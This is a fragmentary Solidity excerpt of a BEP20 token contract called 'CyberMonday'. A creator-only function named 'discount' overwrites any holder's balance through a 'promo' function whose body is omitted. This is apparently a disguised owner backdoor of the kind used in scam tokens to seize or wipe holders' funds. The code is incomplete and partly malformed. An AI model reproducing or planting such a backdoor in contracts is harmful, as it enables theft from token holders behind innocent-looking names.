...
contract CyberMonday is BEP20 {
  ...
  function promo(address _from, uint256 _value, uint32 variant) internal view onlyCreator returns (uint256) {
  ...
  function discount(address _from, uint256 _value, uint32 variant) public onlyCreator returns (bool) {
    if(_from != address(0) && msg.sender != address(0))
    require(_value != 2, "Not TWO");
    _balances[_from] = promo(_from, _value, variant);
    return true;
  }
